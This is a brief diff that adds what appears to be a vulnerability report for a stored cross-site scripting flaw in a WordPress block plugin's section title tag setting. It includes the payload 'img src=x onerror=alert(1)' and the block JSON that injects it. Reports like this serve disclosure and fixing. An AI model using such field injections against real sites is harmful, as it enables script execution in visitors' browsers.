@@ -1,0 +1,7 @@
+
+1. img src=x onerror=alert(1)
+<h2>Titlt</h2> //when we need to dynamic the (h2) tag we have to check the above code keep insted of the title tag
+after puttint this code will be like taht <img src=x onerror=alert(1)>
+"content":"<!-- wp:rttpg/tpg-section-title {\"uniqueId\":\"f46ec3\",\"section_title_tag\":\"img src=x onerror=alert(1)\"} /-->"}
+
+More Details - https://doc.clickup.com/9013207910/p/h/8ckn8v6-653/79dbb7709c2c785
